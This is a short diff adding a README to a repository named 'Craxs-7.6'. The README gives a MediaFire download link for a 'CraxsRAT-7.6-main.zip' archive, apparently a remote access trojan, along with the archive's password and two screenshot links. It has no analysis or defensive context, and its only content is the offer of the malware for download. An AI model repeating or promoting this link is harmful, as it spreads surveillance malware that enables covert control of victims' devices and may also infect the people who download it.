@@ -1,1 +1,11 @@
 # Craxs-7.6
+[Click Here to Download](https://www.mediafire.com/file/tp1tqq3a32c60z6/CraxsRAT-7.6-main.zip/file)
+
+
+[Password: S0f4fr33!]
+
+.
+![IMG1](https://github.com/user-attachments/assets/d6f49571-c5d8-4555-8422-990990334e1e)
+
+![IMG2](https://github.com/user-attachments/assets/a956cd0c-dbfd-4dee-8b35-39944b75846f)
+
